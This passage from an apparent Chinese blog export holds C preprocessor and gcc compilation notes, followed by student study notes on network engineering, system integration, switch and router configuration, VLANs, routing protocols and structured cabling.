<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEFINE</span></span><br><span class="line">	<span class="comment">// CODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> OTHERDEFINE</span></span><br><span class="line">	 <span class="comment">// CODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> OTHERDEFINE2</span></span><br><span class="line">	 <span class="comment">// CODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>条件不满足编译</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEFINE</span></span><br><span class="line">		 <span class="comment">// CODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br></pre></td></tr></table></figure>

<h1 id="程序编译"><a href="#程序编译" class="headerlink" title="程序编译"></a>程序编译</h1><h2 id="一键生成可执行文件"><a href="#一键生成可执行文件" class="headerlink" title="一键生成可执行文件"></a>一键生成可执行文件</h2><p><code>gcc program.c -o program</code></p>
<h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>展开预处理命令</p>
<p><code>gcc program.c -o program.i -E</code></p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>生成汇编文件</p>
<p><code>gcc program.i -o program.s -S</code></p>
<h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>生成可重定位文件</p>
<p><code>gcc program.s -o program.o -c</code></p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>链接生成可执行文件</p>
<p><code>gcc program.o -o program</code></p>
]]></content>
      <categories>
        <category>Tutorial</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>网络应用开发与系统集成</title>
    <url>/2022/07/02/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E4%B8%8E%E7%B3%BB%E7%BB%9F%E9%9B%86%E6%88%90/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><strong>采用TCP/IP体系结构的互联网已经称为企业，国家乃至全球的信息基础建设。设计，建造和测试基于TCP/IP技术的计算机网络是网络工程的任务</strong></p>
<p>网络工程通过总结并研究与网络设计，实施和维护有关规范和技术，为设计和建造满足用户需求的计算机网络提供方法</p>
<p><strong>科学</strong></p>
<p>是对各种事实和现象进行观察，分类，归纳，演绎，分析，推测，计算和实验，从而发现规律，并对各自定量规律予以验证和公式化的知识体系</p>
<h2 id="网络工程定义"><a href="#网络工程定义" class="headerlink" title="网络工程定义"></a>网络工程定义</h2><ol>
<li>将系统化的，规范的，可度量的方法应用于网络系统结构设计与实现、网络系统规划与集成、网络管理与维护、网络安全保障和网络应用开发的过程</li>
<li>对1中所述方法的研究<span id="more"></span>
<h2 id="系统集成"><a href="#系统集成" class="headerlink" title="系统集成"></a>系统集成</h2></li>
</ol>
<h3 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h3><p>系统是指为实现某一目标而应用的一组元素的有机结合，而系统本身又可以作为一个元素单位(或称子系统或组件)参与多次组合，这种组合过程可概括为系统集成。系统集成是目前常用的一种实现复杂系统的工程方法。</p>
<aside>
📖 既是一种重要的工程建设思想，也是一种解决问题的方法论

</aside>

<h3 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h3><ol>
<li>较高的质量水准</li>
<li>系统建设速度快</li>
<li>交钥匙解决方案</li>
<li>标准化配置</li>
</ol>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
<li>关注接口规范</li>
<li>关注系统整体性能</li>
<li>重视工程规范和质量管理</li>
<li>建立良好的用户关系</li>
</ol>
<h3 id="集成模型"><a href="#集成模型" class="headerlink" title="集成模型"></a>集成模型</h3><p>该模型从系统级开始，接着是用户需求分析，逻辑网络设计，物理网络设计与实现和测试阶段。由于在物理网络设计阶段，网络设计者通常采用系统集成方法，因此该模型被称为网络工程的系统集成模型。</p>
<aside>
😶‍🌫️ **重点：考虑用户需求，约束和目标**

</aside>

<p>（用户需求分析→逻辑网络设计）→物理网络设计与实现→测试<br>            系统/信息工程        ↑                               ↑                  ↓</p>
<aside>
👹 该设计方法是可以循环的

</aside>

<h3 id="集成过程"><a href="#集成过程" class="headerlink" title="集成过程"></a>集成过程</h3><p>从技术，管理，用户关系 三个关键因素考虑,对于不同规模的网络，系统集成的过程可能有很大差异，可能要通过结构化布线系统加以连接</p>
<ol>
<li>选择系统集成商或设备供应商：投标招标<br>用户方都以招标的方式选择系统集成商或设备供应商。用户对网络系统的要求应体现在发布的招标文件中。一旦中标，系统集成商则需要与用户方商谈并签署合同。合同是系统集成商与用户方之间的一种商务活动契约，受法律保护</li>
<li>网络系统的需求分析：实地勘察<br>关注网络系统的需求问题，即确定该网络系统要支持的业务，要完成的网络功能，要达到的性能等。用户需求分析：网络应用目标，网络应用约束和网络的通信特征。全面细致地勘探整个网络环境</li>
<li>逻辑网络设计：结合投标方式，由网络架构师设计-<br>把重点放在网络系统的部署方案，IP地址规划和网络拓扑结构等概要设计方面<br>逻辑网络设计由网络架构设计师完成：采用平面结构还是三层结构，如何规划IP地址没采用何种选路协议，采用何种网络管理方案</li>
<li>物理网络设计：<br>结构化布线<br>网络机房环境：设备安装环境，照明，温度，湿度，系统防电磁辐射的环境<br>供电系统<br>在网络需求分析和网络逻辑设计的基础上完成配套网络设备选型<br>注意：1 尽量选用同一厂商的设备 2 尽可能选择采用主流网络技术的产品，如采用以太网技术等<br>3 需要经广域网（WAN）互联的设备要有支持主流WAN接口的能力 4 网络设备的交互能力和端口数量应由一定余量</li>
<li>网络安全设计：<br>鉴别信息资源<br>进行风险评估，从而设计相应安全策略，采用相应安全产品，如防火墙，入侵检查系统，漏洞扫描系统，防病毒系统，数据备份系统和监测系统。</li>
<li>网络设备安装测试与验收<br>网络系统构建好后，需要进行测试，目的是检查网络系统是否达到预定的设计目标，能否满足网络应用的性能需求，使用的技术和设备的选型是否合适<br>加电并连入服务器网络以进行检查<br>网络测试通常包括协议测试，布线测试，网络设备测试，网络系统测试，网络安全测试，网络吞吐量测试</li>
<li>网络系统测试验收：<br>用户方正式认可系统集成商完成的网络工程的手续，用户方要通过网络系统验收来确认工程项目是否已经达到设计要求<br>现场验收，文档验收</li>
<li>用户培训和系统维护<br>系统成功安装后，系统集成商必须为用户提供必要培训，培训对象可分为网管人员和一般用户等类型</li>
</ol>
<h3 id="层次模型"><a href="#层次模型" class="headerlink" title="层次模型"></a>层次模型</h3><ul>
<li>环境平台层</li>
</ul>
<p>平台能够为网络系统的运行提供支持的基础设备，需要考虑结构化布线系统，机房和电源等环境问题</p>
<ul>
<li>网络平台层</li>
</ul>
<p>由于设备标准化成都高，设备的成本非常低</p>
<ul>
<li>信息平台层</li>
</ul>
<p>为标准因特网服务(DNS ,WEB,FTP)和特定网络服务(P2P,MEDIA,OFFICE)提供的支持</p>
<ul>
<li>应用平台层</li>
<li>网络安全结构</li>
</ul>
<table>
<thead>
<tr>
<th>应用平台层</th>
<th>网络</th>
</tr>
</thead>
<tbody><tr>
<td>信息平台层</td>
<td>安全</td>
</tr>
<tr>
<td>网络平台层</td>
<td>结构</td>
</tr>
<tr>
<td>环境平台层</td>
<td>层</td>
</tr>
</tbody></table>
<h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p>文档是指某种数据管理概要和其中所记录的数据，文档也是网络系统的一部分，系统文档的编制在网络工程设计工作中占有突出的地位并具有一定的工作量。高质量，高效率地开发，分发，管理和维护文档对于转让变更，修正，扩充和使用文档以及充分发挥系统效率有着重要的意义</p>
<h3 id="重要性"><a href="#重要性" class="headerlink" title="重要性"></a>重要性</h3><ul>
<li>提高系统设计过程中的能见度</li>
<li>提高设计效率</li>
<li>可作为设计人员在一定阶段的工作成果和工作结束标志</li>
<li>记录设计过程中的有关信息，便于协调以后的系统设计，使用和维护</li>
<li>提高与系统的运行，维护和培训的有关信息，便于管理设计操作人员，用户之间的协作交流和了解，使系统设计活动更科学，更有成效。</li>
<li>便于潜在用户了解系统功能，性能等各项指标，为他们选购或定制符合自己需求的系统提供依据</li>
</ul>
<p>文档可以用自然语言，热别设计的形式语言，介于两者之间的半形式语言，各类图标和表格来表示，必须是可阅读的。</p>
<h3 id="质量要求"><a href="#质量要求" class="headerlink" title="质量要求"></a>质量要求</h3><ol>
<li>针对性</li>
<li>精确性</li>
<li>清晰性</li>
<li>完整性</li>
<li>灵活性</li>
</ol>
<h1 id="设计基础"><a href="#设计基础" class="headerlink" title="设计基础"></a>设计基础</h1><p>从逻辑上说，构成因特网的所有网络实体均可以被抽象为两种基本构件：称为链路的物理介质和称为节点的计算设备</p>
<h3 id="网络结点"><a href="#网络结点" class="headerlink" title="网络结点"></a>网络结点</h3><p>专用的计算机，如交换机或路由器等，它们通常是由专用硬件和内置专业软件实现的</p>
<h3 id="网络链路"><a href="#网络链路" class="headerlink" title="网络链路"></a>网络链路</h3><p>可在各自不同的物理介质上实现，包括双绞线，同轴电缆，光纤以及自由空间</p>
<h2 id="连接方式"><a href="#连接方式" class="headerlink" title="连接方式"></a>连接方式</h2><p>如果点到点链路上可以同时传输两个比特流，每个方向传输一个，这样的链路称为<strong>全双工链路</strong></p>
<p>如果点到点链路一次仅支持数据向一个方向传输，并且连接到其上的两个节点能轮流使用它，则这样的链路称为<strong>半双工链路</strong></p>
<p>点对点 [ ]—[ ] 一条物理链路有时仅与一对节点相连<br>多点接入 [ ] [ ] [ ] [ ] 多于两个节点共享同一条链路</p>
<h2 id="层次结构"><a href="#层次结构" class="headerlink" title="层次结构"></a>层次结构</h2><p>广域网范围：国际 主干/国家 区域/中间层 桩/企业 </p>
<p>接入网范围：区域/中间层 桩/企业 端系统/主机</p>
<p>局域网范围：桩/企业 端系统/主机</p>
<p><img src="https://pic.imgdb.cn/item/62c003665be16ec74a3cafe1.png" alt="层次结构"></p>
<p>企业网， 是为企业提供信息传递和资源共享的计算机网络， 它通常包括若干LAN，是一个广义的概念， 它通常可与校园网和园区网等名词互换使用，将因特网的标准和技术应用于企业网， 就形成了用于企业内部的专用网络内联网(Intranet) 而与内联网相对应的是外联网(Extranet), 它是对内联网的扩展和外延</p>
<ul>
<li><strong>主干网络</strong>通常是大容量载体，用于连接其他网络，单独主机通常不与主干相连</li>
<li><strong>区域网络</strong>与主干网络紧密相关，仅在规模，经每个端口连接的网络数与地理覆盖方面与主干网络有差异。区域网络是主干网络的用户</li>
<li><strong>桩(stub)网络/企业网</strong> 连接主机和LAN，指所有的流量只由该网络中的用户产生的网络。企业网则指若干有关联的局域网的集合</li>
<li><strong>端系统或主机</strong> 他们通常是企业网的用户</li>
</ul>
<h3 id="基本互联设备与层次"><a href="#基本互联设备与层次" class="headerlink" title="基本互联设备与层次"></a>基本互联设备与层次</h3><table>
<thead>
<tr>
<th>名称</th>
<th>互联层次</th>
<th>基本特征</th>
</tr>
</thead>
<tbody><tr>
<td>网关</td>
<td>应用层</td>
<td>区分端口地址及应用信息</td>
</tr>
<tr>
<td>路由器，三层交换机</td>
<td>网络层</td>
<td>区分IP地址</td>
</tr>
<tr>
<td>网桥，交换机</td>
<td>数据链路层</td>
<td>区分MAC地址</td>
</tr>
<tr>
<td>集线器，中继器</td>
<td>物理层</td>
<td>比特复制</td>
</tr>
</tbody></table>
<h2 id="交换机类型"><a href="#交换机类型" class="headerlink" title="交换机类型"></a>交换机类型</h2><h3 id="物理结构划分"><a href="#物理结构划分" class="headerlink" title="物理结构划分"></a>物理结构划分</h3><ul>
<li>独立式</li>
<li>堆叠式</li>
<li>模块化</li>
</ul>
<h3 id="功能划分"><a href="#功能划分" class="headerlink" title="功能划分"></a>功能划分</h3><ul>
<li>智能式</li>
<li>直通式</li>
<li>存储转发式</li>
</ul>
<h2 id="路由器工作原理"><a href="#路由器工作原理" class="headerlink" title="路由器工作原理"></a>路由器工作原理</h2><aside>
🚧 IP层次互连设备仅有一种，即路由器

</aside>

<p>路由器通过处理IP地址来转发TP分组， 形成一个虚拟通信网络 ， 将异构的多种通信网络互连起来， 并使网络具有可扩展性</p>
<h2 id="路由器在网络层工作的两个过程"><a href="#路由器在网络层工作的两个过程" class="headerlink" title="路由器在网络层工作的两个过程"></a>路由器在网络层工作的两个过程</h2><ul>
<li>找到分组相应的出口， 查找选路表即可</li>
<li>将分组从入口送到出口, 这取决于路由器的体系结构</li>
</ul>
<h2 id="交换方式"><a href="#交换方式" class="headerlink" title="交换方式"></a>交换方式</h2><ul>
<li>经内存交换</li>
</ul>
<p>若内存带宽为每秒可写进或读出B个分组，则总的抓发吞吐量必然小于B/2</p>
<ul>
<li>经一根总线交换（直通式）</li>
</ul>
<p>总线带宽可达千兆比特/秒，则用于接入网或企业网的路由器来说，通过总线交换通常是足够的</p>
<ul>
<li>经一个互联网交互(纵横)(存储转发式)</li>
</ul>
<p>使用一个更复杂的互联网络，具有最高的吞吐量</p>
<h2 id="三层交换基本过程"><a href="#三层交换基本过程" class="headerlink" title="三层交换基本过程"></a>三层交换基本过程</h2><p><img src="https://pic.imgdb.cn/item/62c003665be16ec74a3caff4.png" alt="三层交换"></p>
<p>假设两个使用IP协议的站点A，B通过三层交换机进行通信，A开始发送时，把自己的IP地址与B的IP进行比较，判断B是否与自己在同一子网。若B与A在同一子网内，则进行2层转发。若不在则A要向默认网关发出ARP(地址解析)，而默认网工的IP其实是三层交换机的三层交互模块。</p>
<p>当A对默认网关的IP地址广播一个ARP请求时，如果三层交互模块在以前的通信过程中已经知道B的MAC地址，则向A回复B的MAC，否则交换机交换模块根据路由信息向B广播一个ARP请求，B收到后回复其MAC地址，三层交换模块保存后回复给A，同时B的MAC地址发送到二层交换引擎的MAC地址表中。</p>
<p>此后，A向B发送的数据便全部交给二层交换处理，信息得以高速交换。由于仅仅在路由过程中才需要三层处理，绝大部分数据都通过二层交换转发，因此三层交换机的速度很快，有接近二层交换机的速度，同时三层交换机的价格比路由器之类的设备价格要低</p>
<h2 id="访问服务器"><a href="#访问服务器" class="headerlink" title="访问服务器"></a>访问服务器</h2><ul>
<li>一种特殊的路由器， 它能为远程PC用户接入企业网提供服务。 可以为专用硬件设备，也可是在PC机上插入多串行口卡后运行专用软件而成</li>
</ul>
<p>用户通过调制解调器经电话线或ISDN等线路于访问服务器连接，再经该访问服务器接入企业网，用于零散用户远程入网</p>
<p><strong>提供的安全特性</strong></p>
<ul>
<li>鉴别用户身份，即需要输入用户名和口令</li>
<li>回叫安全特性</li>
</ul>
<h2 id="双绞线"><a href="#双绞线" class="headerlink" title="双绞线"></a>双绞线</h2><p>是目前最常用的传输介质之一</p>
<p>本质上就是两根相互绝缘的导体按一定规律相互缠绕形成螺旋结构的两根铜线，外部包裹屏蔽层或塑橡外皮构成，缠绕可以减少电磁干扰。</p>
<h3 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h3><ul>
<li>EIA/TIA 568A</li>
<li>EIA/TIA 568B</li>
</ul>
<aside>
💕 RJ45:水晶头

</aside>

<h2 id="光纤电缆"><a href="#光纤电缆" class="headerlink" title="光纤电缆"></a>光纤电缆</h2><p>光纤电缆由一捆光导纤维组成，光缆的芯由导光性极好的玻璃纤维或塑料制成，芯的外层是涂覆层，最外层是速率的保护层。</p>
<p>光缆中传输的是广播，光缆船速速率可达几千Mbit/s</p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>单模光纤</p>
<p>多模光纤</p>
<h2 id="以太网技术"><a href="#以太网技术" class="headerlink" title="以太网技术"></a>以太网技术</h2><h3 id="以太网原理"><a href="#以太网原理" class="headerlink" title="以太网原理"></a>以太网原理</h3><p>CSMA/CD 发前先听，发现碰撞 立即停发，发送强化</p>
<h3 id="快速以太网"><a href="#快速以太网" class="headerlink" title="快速以太网"></a>快速以太网</h3><p>IEEE802.3u标准包括</p>
<ul>
<li>100Base-T4</li>
<li>100Base-TX</li>
<li>100Base-FX</li>
</ul>
<h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><h3 id="服务器技术"><a href="#服务器技术" class="headerlink" title="服务器技术"></a>服务器技术</h3><p>CISC复杂指令集计算机</p>
<p>RISC精简指令集计算机</p>
<p>SAS接口（串行连接SCSI接口）</p>
<h3 id="服务器分类"><a href="#服务器分类" class="headerlink" title="服务器分类"></a>服务器分类</h3><p>PC服务器</p>
<p>UNIX服务器</p>
<p>Linux服务器</p>
<h3 id="RAID独立磁盘冗余阵列"><a href="#RAID独立磁盘冗余阵列" class="headerlink" title="RAID独立磁盘冗余阵列"></a>RAID独立磁盘冗余阵列</h3><p>简称磁盘阵列</p>
<h1 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h1><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>是一台专门用于通信的计算机， 它由交换机硬件系统和交换机橾作系统组成</p>
<p>硬件包括：中央处理器，随机存储器，只读存储器，可读写存储器和外部端口等</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li>交换机与计算机相连，使两者能够交互信息</li>
<li>计算机向被配置的交换机发送配置命令</li>
<li>交换机单位IOS可以理解这些配置命令，并改变交换机运行状态，从而达到了配置交换机的目的</li>
</ol>
<p><code>[vlan10]port g0/0/5</code>    #将P5添加到vlan10</p>
<h3 id="配置连接跨越多台交换机的VLAN干道-P96-P97"><a href="#配置连接跨越多台交换机的VLAN干道-P96-P97" class="headerlink" title="配置连接跨越多台交换机的VLAN干道  P96 P97"></a>配置连接跨越多台交换机的VLAN干道  P96 P97</h3><ul>
<li>答案  <img src="https://pic.imgdb.cn/item/62c003665be16ec74a3caf90.png" alt="VLAN配置"></li>
</ul>
<h3 id="mac地址绑定功能（先关闭学习）"><a href="#mac地址绑定功能（先关闭学习）" class="headerlink" title="mac地址绑定功能（先关闭学习）"></a>mac地址绑定功能（先关闭学习）</h3><ul>
<li>答案  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭学习功能，端口与主机Mac地址绑定 </span></span><br><span class="line">int g0/0/4</span><br><span class="line">mac-address learning <span class="built_in">disable</span> action discard</span><br><span class="line">quit</span><br><span class="line">mac-address static xxxx-xxxx-xxxx g0/0/4 vlan 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主机IP与MAC绑定</span></span><br><span class="line">user-bind static ip-address 192.9.201.11 mac-addr xxxx-xxxx-xxxx vlan 20</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="端口聚合的注意事项"><a href="#端口聚合的注意事项" class="headerlink" title="端口聚合的注意事项"></a>端口聚合的注意事项</h3><ul>
<li>交换机最大聚合端口数是由限制的，入锐捷3526交换机最大端口聚合数是8</li>
<li>聚合的端口的速度必须一致，聚合的端口必须属于同一个VLAN（如果有的话）</li>
<li>聚合的端口使用的传输媒介相同，聚合的端口必须属于网络的同一层次，并与聚合端口也要在同一层次</li>
<li>配置后的聚合端口可以像普通端口一样接受管理和使用</li>
</ul>
<h3 id="配置三层交换机"><a href="#配置三层交换机" class="headerlink" title="配置三层交换机"></a>配置三层交换机</h3><ul>
<li>答案  <img src="https://pic.imgdb.cn/item/62c003665be16ec74a3cafb4.png" alt="三层交换机的配置"></li>
</ul>
<hr>
<ul>
<li>选择题  配置交换机方法：Console线命令行方式，Telnet,Aux方式远程拨入，Web  默认vlan号是1  物理设备没问题，但是通过控制台端口不能正常登录交换机，可能的原因是超级终端端口速率为57600b/s  IEEE制定实现Tag Vlan使用的是IEEE 802.1Q标准  TAG标在数据帧首部的中部  IEEE802.1Q数据帧的主要控制信息是VID  VLAN：隔离广播域，可以限制网上的计算机互相访问的权限<br>  发现交换机中配置了VLAN10的IP的地址，作用是管理IP地址  IEEE的802.1W定义了RSTP  常见生成树协议由STP RSTP MSTP  生成树协议是由802.1D标准规定的  STP将整个网络路由定义为二叉树结构  STP根本目的是防止广播风暴</li>
</ul>
<h1 id="网络需求分析"><a href="#网络需求分析" class="headerlink" title="网络需求分析"></a>网络需求分析</h1><h2 id="需求分析定义"><a href="#需求分析定义" class="headerlink" title="需求分析定义"></a>需求分析定义</h2><p>在网络设计过程中用来获取和确定系统需求的过程</p>
<h3 id="网络需求"><a href="#网络需求" class="headerlink" title="网络需求"></a>网络需求</h3><p>描述了网络系统的行为，特性或属性，是在设计实现网络系统过程中对系统的约束，在需求分析阶段应确定用户有效完成工作工作所需的网络服务和性能水平。需求分析是网络设计过程的基础</p>
<h2 id="分析网络应用目标"><a href="#分析网络应用目标" class="headerlink" title="分析网络应用目标"></a>分析网络应用目标</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><ul>
<li>从企业高层管理者开始收集商业需求</li>
<li>收集用户群体需求</li>
<li>收集支持用户和用户应用的网络需求</li>
</ul>
<h3 id="明确网络设计目标，典型网络设计目标包括"><a href="#明确网络设计目标，典型网络设计目标包括" class="headerlink" title="明确网络设计目标，典型网络设计目标包括"></a>明确网络设计目标，典型网络设计目标包括</h3><ul>
<li>加强合作交流，共享的重要数据资源</li>
<li>加强对分支机构或部属的调控能力</li>
<li>降低电信及网络成本，包括与语音，数据，视频等独立网络有关的开销</li>
</ul>
<h3 id="明确网络设计项目范围"><a href="#明确网络设计项目范围" class="headerlink" title="明确网络设计项目范围"></a>明确网络设计项目范围</h3><ul>
<li>是设计新网络还是修改网络</li>
<li>网络规模：一个网段，一个（组）局域网，一个广域网，还是远程网络或一个完整的企业网</li>
<li>明确用户的网络应用：“应用名称 | 应用类型 | 是非为新应用 | 重要性 | 备注”</li>
</ul>
<h2 id="网络设计约束"><a href="#网络设计约束" class="headerlink" title="网络设计约束"></a>网络设计约束</h2><ul>
<li>政策约束</li>
</ul>
<p>与网络用户讨论企业办公政策和技术发展路线是必要的</p>
<ul>
<li>预算约束</li>
<li>时间约束</li>
<li>应用目标检查表</li>
</ul>
<h2 id="网络分析的技术指标"><a href="#网络分析的技术指标" class="headerlink" title="网络分析的技术指标"></a>网络分析的技术指标</h2><p>定量地分析网络性能，首先要确定网络性能的技术指标，有许多国际组织定义了网络性能测试指标，这些技术指标为我们设计网络提供了一条性能基线。</p>
<p><strong>网络性能指标有两类</strong>：</p>
<ul>
<li>网元级：网络设备的性能指标</li>
<li>网络级：将王洛平看作一个整体，其端到端的性能指标</li>
</ul>
<p><strong>时延</strong></p>
<p>从网络的一段发送一个比特到网络的另一端接收到这个比特所经历的时间</p>
<aside>
💕 总时延=传播时延+传送时延+排队时延分组交换时延+排队时延
           ≈传播时延+传送时延+排队时延
传播时延=距离/光在媒体中的速度
传输时延=信息量/带宽

</aside>

<p>往返时延RTT / 单向时延OWL</p>
<aside>
😪 RTT≠2OWL

</aside>

<p><strong>吞吐量</strong></p>
<p>在单位时间内传输无差错数据的能力</p>
<p>吞吐量可针对某个特定连接或会话定义，也可以定义网络总的吞吐量</p>
<p><strong>容量</strong>：数据通信设备发挥预定功能的能力，它经常用来描述通信信道或连接能力</p>
<p><strong>网络负载</strong>：在单位时间内总共发送的平均帧数</p>
<p><strong>吞吐量：</strong>网络负载x发送成功率</p>
<p><strong>有效吞吐量</strong>：表示了应用层的吞吐量</p>
<p><strong>网络丢包率(丢分组率)</strong></p>
<p>在某时段内在两点传输中丢失分组与总的分组发送量的比率</p>
<p><strong>时延抖动</strong></p>
<p>分组的单向时延的变化</p>
<p><strong>路由</strong></p>
<p>为特定的“结点-链路”集合，该集合是由路由器中的选路算法决定的，选路算法决定分组所采用的路径</p>
<p><strong>响应时间</strong></p>
<p>从服务请求发出到接收到相应响应所花费的时间，它经常用来特指客户机向主机交互地发出请求并得到响应信息所需要的时间</p>
<p><strong>利用率</strong></p>
<p>指定设备在使用时所能发挥的最大能力</p>
<p><strong>网络效率</strong></p>
<p>为产生所需的输出要求的系统开销</p>
<p>可用性</p>
<p>网络或网络设备可用于执行预期任务的时间总量（百分比）</p>
<p>案例教学1  网络实验室局域网的设计！！！！！！！！！！！！！！</p>
<ul>
<li>分析  <strong>设计要点</strong><ul>
<li>为新建的网络实验峚设计局域网， 需要进行网络需求分析。该实验室具有80台PC, 且它们需要共享实验服务器信息</li>
<li>用百兆交换机若干</li>
<li>配置交换机的链路聚合功能</li>
</ul>
  <strong>需求分析和设计考虑</strong>  一个具有80 台PC 的网络实验室仍然属于一个小型LAN, 但由于该网络有几十名学生要在较短时间内（如10秒时间内）打开共享实验服务器上的信息需求，需要对网络应用需求进行分析， 井进行相应的设计：<ul>
<li>取4台PC 为一组， 组内突发流量峰值可达几十Mpbs, 组间的通信量通常较小。组内使用一个<br>8端口的百兆交换机</li>
<li>80 台PC 需要同时共享实验服务器的信息， 打开实验支持系统网站页面（约30KB) 、下载软件实验工具（约3MB) 和文档（约80KB)。为了使时延感觉不致太大，要求访问文件的时延不大于10 秒</li>
<li>要求在10 秒内从一台服务器向外输出量将约达250MB, 即约199Mpbs</li>
<li>考虑到一台服务器输入数据需要处理动态网页和处理数据库的能力， 将难以保证在10秒内完成这样的任务。因此， 可以考虑采用双服务器设计方案</li>
</ul>
  <strong>设计方案</strong><ul>
<li>每40台PC 共享一台服务器， 这样共需2台服务器</li>
<li>由于目前的专用 PC 服务器通常都标准配两块千兆网卡， 服务器与交换机连接可采用两个百兆链路聚合的措施， 增强访问服务器的能力</li>
<li>每4台PC 组成一组， 共需20 组，每组用一个8 端口百兆交换机将它们相连， 共需20 个这样的交换机</li>
<li>每10组用一个16端口的百兆交换机互联，形成多星结构</li>
<li>增强容错，将这两台16端口百兆交换机用百兆双绞线连接起来</li>
</ul>
  <img src="https://pic.imgdb.cn/item/62c003665be16ec74a3cafbd.png" alt="参考拓扑图"></li>
</ul>
<h1 id="环境平台设计"><a href="#环境平台设计" class="headerlink" title="环境平台设计"></a>环境平台设计</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>布线系统是计算机网络系统和电话系统的基础设施 </p>
<h3 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h3><p>结构化布线 | 非结构化布线</p>
<p>结构化布线系统是一种跨学科，跨行业的系统工程，能够满足综合性的应用，布线系统所采用的结构，通常要根据技术要求，地理环境和用户分布等情况而定，设计的目标是在满足使用的技术指标的情况下，使系统布线合理，造价经济，施工维护方便</p>
<h2 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h2><p>具有良好的综合性和兼容性</p>
<p>适应性强，使用灵活</p>
<p>易于扩容，便于维护</p>
<p>具有科学性和经济实用意义</p>
<h2 id="应用场合"><a href="#应用场合" class="headerlink" title="应用场合"></a>应用场合</h2><p>智能化建筑的布线系统，商业贸易类型的布线系统，机关办公类型的布线系统 </p>
<h2 id="结构化布线系统组成"><a href="#结构化布线系统组成" class="headerlink" title="结构化布线系统组成"></a>结构化布线系统组成</h2><p>工作区（终端）子系统</p>
<p>水平布线子系统</p>
<p>垂直干线子系统</p>
<p>管理子系统</p>
<p>设备间子系统</p>
<p>建筑群子系统</p>
<h1 id="配置路由器"><a href="#配置路由器" class="headerlink" title="配置路由器"></a>配置路由器</h1><p>路由器的强大选路功能体现在只需配置相邻子网的端口IP地址，再配置选路协议后，这些互联的路由器就能自行学习到到达全网的各个子网的路由信息</p>
<h2 id="配置路由器方式"><a href="#配置路由器方式" class="headerlink" title="配置路由器方式"></a>配置路由器方式</h2><ol>
<li>PC → COM控制端口直连 </li>
<li>Telnet</li>
<li>SNMP /Web管理工作站</li>
<li>TFTP</li>
<li>路由器Aux口连接调制解调器实现远程配置(交换机没有)</li>
</ol>
<h2 id="配置静态路由"><a href="#配置静态路由" class="headerlink" title="配置静态路由"></a>配置静态路由</h2><ul>
<li>重要干线路由通常要配置静态路由</li>
<li>精通路由优先于动态路由，无论路由器配置动态选路协议是否，它都会按精通路由来转发分组，仅当路由器配置精通路由的端口出现了故障才会按动态选路协议给吹的路由进行转发</li>
<li>动静态结合可以提高网络可靠性</li>
<li>静态路由是网管人员人工配置的，一旦路由生效就不会自行变化</li>
<li>所有的路由中，静态路由优先级最高，即链路费用为0或1</li>
<li>选择题   默认选路协议的默认管理距离是 1 RIP选路协议的默认管理距离是120 OSPF默认管理距离是110  OSPF网络最大条数没有限制  配置OSPF路由最少3条命令  OSPF必须有的是Area0  OSPF管辖距离是110  距离矢量RIP GRP 链路状态OSPF IS-IS  选路表中0.0.0.0 代表默认路由  将一个新的办公子网加入原来的网络，需要手工配置IP选路表，输入Ip route  RIP 的holddown times 180  默认路由是所有非路由分组在此进行转发  RIP向相邻路由发送更新时，以30s为更新计时器  选路协议中的管理距离告诉我们这条由有关路由信息的等级的信息  企业网规划使用三层路由器是因为三层交换机可以实现路由器的所有功能  三层交换机中三层表示的不是网络结构层次的第三层</li>
</ul>
<h1 id="企业网设计"><a href="#企业网设计" class="headerlink" title="企业网设计"></a>企业网设计</h1><h2 id="网络结构设计中的需求"><a href="#网络结构设计中的需求" class="headerlink" title="网络结构设计中的需求"></a>网络结构设计中的需求</h2><ul>
<li>网络要素的分布及连接关系</li>
</ul>
<p>分布情况及连接关系反映了不同设备再网络中的地位和作用</p>
<ul>
<li>网络规模</li>
</ul>
<p>网络结构图应当反应用户网络的=规模</p>
<ul>
<li>传输性能需求</li>
</ul>
<p>网络结构图应当根据主要传输信息类别确定链路传输带宽要求</p>
<ul>
<li>传输介质</li>
</ul>
<p>网络结构图应当反映网络中主要链路采用的传输介质</p>
<ul>
<li>信息服务需求</li>
</ul>
<p>网络结构图应当反映网络中需要建设的信息服务资源</p>
<ul>
<li>路由选择需求</li>
</ul>
